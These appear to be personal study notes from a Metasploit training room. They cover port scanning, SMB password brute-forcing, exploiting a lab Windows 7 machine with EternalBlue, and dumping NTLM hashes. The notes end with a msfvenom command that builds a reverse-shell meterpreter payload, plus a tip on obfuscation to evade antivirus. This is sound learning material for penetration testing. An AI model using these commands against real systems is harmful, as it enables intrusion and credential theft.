# Metasploit Scanning

`/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`

'search portscan' -> modules that allow us to scan open ports on target machine

^ these require us to set options -> 'show options'
- CONCURRENCY (num of targets to be scanned concurrently)
- PORTS (range x-y)
- RHOSTS (target)
- THREADS (more = faster)

we can perform [[2026-01-04 TryHackMe Lo-Fi LFI Writeup|Nmap]] scans from msfconsole prompt
- note: msfconsole is not the most optimal way for speedy port scanning


## Scanner Modules

udp_sweep
- does not exhaust all possible DNS services
- quick for DNS / NetBIOS

smb_(enumshares/version)
- useful in corporate network

### Real Usage
- I needed to check the service running on port 8000
- I was given an IP

`nmap -T4 -n -sV -sC IP`
- successfully got the service: webfs/1.21
Also figured out that I could have simply ran nmap that specifies one port
`nmap -p 8000 IP `

- I also neede to find an SMB user's password
- I was given the username
- I was given a wordlist

`search type:auxiliary smb`
- found the smb_login module
- set the correct options/params
- specifically, PASS_FILE = wordlist, SMBUser = given_username


## Metasploit Database
context: pentesting likely has multiple targets
- msf has database function to simplify managing many targets
- involves settting up PostgreSQL database

`msf6 > db_status`
`msf 6 > workspace`
- we can now manage multiple workspaces

`db_nmap [args]`
- results will save to appropriate db

`hosts`
`services`
^ lists hosts/services 

### Typical  Flow 
`db nmap`
- find all hosts
Escalate by scanning for open ports + vulnerabilities

`services -S [service`
- allows us to search for specific services in current env.
- useful to find http, ftp, smb, ssh, rdp

## Vulnerability
reminder: exploit is the "how" and payloads are the "what" (see [[2026-01-04 Metasploit Modules and Commands|modules]] for details)

-> as such, exploits in msfconsole have their designated payloads
`set payload`

Background session with CTRL + Z | abort with CTRL + C

## Practice
- I am given a vulnerable target machine IP
- Have to identify the vulnerability and conduct exploit myself

### My Steps
`nmap -sC -sV -n IP`
-> got intel on the open ports and running services on target machine IP
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49159/tcp open  unknown
```

`msfconsole > search [services]`
- parsing through modules that may give me more information

```
msf6 auxiliary(scanner/netbios/nbname) > run
[*] Sending NetBIOS requests to 10.65.161.248->10.65.161.248 (1 hosts)
[+] 10.65.161.248 [JON-PC] OS:Windows Names:(JON-PC, WORKGROUP, __MSBROWSE__) Addresses:(10.65.161.248) Mac:0e:f5:05:7a:a7:db 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/netbios/nbname) > 
```

-> See that the system is using Microsoft Windows 7 Professional 7601 -> search for Windows 7
`msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
`
Used `search -f flag.txt` to find the specified file and used cat (path) to read its contents

To get user NTLM hashes, I had to look it up.

Basically, we run this command because Windows does not store user passwds in plaintext; this module runs the process of retrieving the password hashes in WinReg

`run post/windows/gather/hashdump`
- "post" module
- hashdump -> retrieves user hashes

## Msfvenom

allows us to generate payloads
`msfvenom -l payloads`
`--list formats` -> to list formats we can output

the purpose of encoders is not to get past the antivirus on a given sytem
- the better method to accomplish bypassing antivirus is obfuscation 

Concepts to know:
- DVWA: Damn Vulnerable Web Application
- Handlers: reverse shells generated in msfvenom payload can be caught by using a handler

### Handlers Cont.
used to keep the connection steady; otherwise, the connection will drop and we lose access to target machine

Payload executes -> sends info back to handler

### Creating meterpreter payload
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`

